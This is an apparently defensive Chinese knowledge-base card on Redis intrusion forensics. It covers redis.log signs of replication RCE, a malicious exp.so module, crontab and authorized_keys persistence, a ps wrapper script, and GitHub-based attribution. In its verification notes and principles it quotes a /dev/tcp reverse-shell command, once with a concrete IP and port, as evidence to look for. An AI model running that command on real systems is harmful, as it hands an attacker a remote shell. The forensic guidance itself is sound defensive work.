---
id: defense-incident-response-redis-log-rogue-module-forensics
title: Redis 入侵取证与溯源：redis.log 区分爆破与主从复制、exp.so 模块加载、crontab 反弹与 authorized_keys 用户名追踪
type: scenario
domain: defense
path: defense/incident-response
technique: redis-log-rogue-module-forensics-trace
aliases:
- Redis 应急响应
- redis.log 分析
- 主从复制取证
- exp.so 模块取证
- authorized_keys 溯源
- GitHub commit 溯源
- ps 命令替换排查
tags:
- incident-response
- forensics
- redis
- linux
- log-analysis
- crontab
- persistence
- osint
- webshell
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V547
  verified_at: '2026-11-11T20:59:42+08:00'
  notes: '已对照原文 content.md 与 31/31 张截图（重点 08-15）核对：redis.log 中 Connecting to MASTER/REPLICA sync/Module ''system'' loaded from ./exp.so/MASTER MODE enabled、根目录 exp.so、crontab /bin/sh -i >& /dev/tcp/192.168.100.13/7777、authorized_keys 注释 xj-test-user、GitHub commit diff 中 #wow-you-find-flag、/usr/bin 下 ps(178B) 与 ps_(133432B) 及 cat ps 的 ps_ ... | grep -v ''thread'' 包装脚本均与截图一致。dedup 候选（Redis 主从复制攻击卡、本地写 authorized_keys 提权卡、MODULE LOAD 提权卡、Web access log 溯源卡）均为攻击视角或不同证据源，非同一链；dup-scan 无涉及 pair。CTF 应急响应题无组件 affected_versions。未执行命令。'
---

## 一句话结论

Redis 服务器被入侵后，可按 `redis.log` 时间线区分爆破源与主从复制源（`Connecting to MASTER`、`REPLICA sync`、`Module 'system' loaded from ./exp.so`、`MASTER MODE enabled`），再沿主从复制 RCE 的落地路径检查 crontab 反弹 shell、`~/.ssh/authorized_keys` 新增公钥与用户名、被替换成包装脚本的 `ps`（原程序改名 `ps_`、过滤 `thread`），最后用用户名检索 GitHub 仓库/提交历史完成溯源。

## 原理

- **redis.log 的两类入侵痕迹**：爆破表现为同一来源 IP 反复连接/认证失败；主从复制 RCE 表现为 `Connecting to MASTER <ip>:<port>`、`MASTER <-> REPLICA sync started`、`Non blocking connect for SYNC fired the event`、`Module '<name>' loaded from ./exp.so`、`MASTER MODE enabled (user request from 'id=... addr=...')`，说明本机被设为从库并从攻击者加载了恶意模块，模块在加载时执行系统命令。
- **落地持久化优先排查 crontab 与 authorized_keys**：主从复制 RCE 的模块通常执行两类命令——写计划任务反弹 shell（`/bin/sh -i >& /dev/tcp/<ip>/<port> 0>&1`，位于 `/etc/crontab`、`/etc/cron.d/*`、`/var/spool/cron/*`）和写 SSH 公钥（`authorized_keys` 追加一条）。
- **authorized_keys 的注释字段泄露用户名**：SSH 公钥行末尾的注释通常是 `user@host` 或自定义用户名；攻击者生成密钥时留下的注释可直接作为溯源关键词。
- **被替换的 ps**：原 `ps` 被改名为 `ps_`，新 `ps` 是一个 bash 包装脚本：调用 `ps_` 获取真实进程列表后 `grep -v 'thread'` 过滤掉挖矿/后门线程，使管理员用 `ps` 看不到异常。通过 `ls -al /usr/bin/ps*`（`ps` 与 `ps_` 的大小、时间、权限差异）与 `cat /usr/bin/ps` 内容即可识别。
- **GitHub 溯源**：攻击者常把同一用户名用于 GitHub 账号与服务器公钥注释；把用户名作为关键词搜索 GitHub 仓库/提交历史，可能找到其 exploit 脚本，提交 diff、注释或历史版本中会留下关键字符串（本案在 exploit 脚本的 diff 注释里发现 `#wow-you-find-flag`）。
- **为什么可行**：Redis 默认把复制/模块事件写入日志；主从复制 RCE 必须落地持久化才能维持访问；攻击者的用户名复用与脚本托管是常见 OPSEC 失误。

## 触发条件

- 可读取 Redis 日志（`/var/log/redis*.log`、`/var/log/redis/` 等）与系统日志。
- 具有 root 或相应文件读权限，可检查 crontab、各用户 `.ssh/authorized_keys`、`/usr/bin` 下系统命令。
- 主机可访问 GitHub（或已有代码镜像/本地仓库），用于用户名检索。
- 入侵时间窗内日志未被清空；攻击者使用了主从复制/模块加载或留下 crontab/公钥。

## 利用步骤

1. **定位日志**：`find / -name "redis*.log" 2>/dev/null`，按时间顺序浏览，统计出现的来源 IP 与事件类型。
2. **区分爆破与主从复制**：同一 IP 大量 AUTH/连接失败为爆破；出现 `Connecting to MASTER`、`REPLICA sync`、`Module ... loaded from ./exp.so`、`MASTER MODE enabled` 为主从复制 RCE，记录来源 IP、模块名与时间。
3. **定位恶意模块**：`find / -name "exp.so" 2>/dev/null`，记录路径、权限、时间与哈希（本案为根目录下的 `exp.so`）。
4. **检查计划任务**：`crontab -l`、`cat /etc/crontab`、`ls -al /etc/cron.d /var/spool/cron*`，查找 `/dev/tcp/<ip>/<port>` 反弹 shell 与远程下载命令。
5. **检查 SSH 公钥**：`cat /root/.ssh/authorized_keys` 及各用户 `.ssh/authorized_keys`，记录新增公钥的注释用户名与写入时间。
6. **检查系统命令替换**：`ls -al /usr/bin/ps*` 看 `ps` 与 `ps_` 的大小/时间差异；`cat /usr/bin/ps` 看是否为过滤 `thread` 的包装脚本；用静态 busybox 或直接读 `/proc` 复核真实进程。
7. **OSINT 溯源**：用用户名搜索 GitHub 仓库与 commit 历史，结合提交 diff/注释、仓库创建时间与邮箱域名补全攻击者画像。

## PoC

无 PoC。本文是应急响应题解，取证流程与示例日志/公钥/包装脚本见原文截图；不提供攻击代码。

## 变体与关联

- **与攻击面卡互补**：`[[pentest-initial-access-redis-master-slave-rogue-server-rce]]` 讲 Redis 未授权 + 主从复制加载恶意模块的攻击方式，本卡是同一事件的日志与主机取证视角。
- **ps 替换机制**：`[[pentest-persistence-linux-system-binary-replacement-ps-wrapper]]` 详细分析包装脚本过滤 `thread` 的实现；本卡把它作为取证检查项。
- **其他隐藏手法**：`[[pentest-persistence-ld-preload-readdir-file-hiding]]` 用 LD_PRELOAD 劫持 readdir 隐藏文件/进程，与 ps 包装脚本同属“让管理员看不到”的对抗，排查时需同时覆盖。
- **MySQL 侧对照**：`[[defense-forensics-mysql-general-log-bruteforce-source-success-time]]` 用通用查询日志聚合爆破源与首次成功时间，思路可迁移到 Redis 日志。

## 检测与防御

- **加固**：Redis 不暴露公网；启用 `requirepass` + ACL；重命名或禁用 `MODULE`、`SLAVEOF`/`REPLICAOF`、`CONFIG` 等危险命令；以低权限用户运行。
- **监控**：对 `redis.log` 的复制、模块加载、`CONFIG SET` 事件告警；监控 `authorized_keys`、crontab、`/usr/bin` 系统命令的完整性变更。
- **取证**：发现模块加载后先备份日志/文件再清理；检查 `/dev/tcp` 反弹 shell、异常公钥与包装脚本；用静态工具复核进程列表。
- **溯源**：保留攻击者公钥注释、用户名、GitHub 仓库/提交链接等 OSINT 线索，交由威胁情报进一步关联。
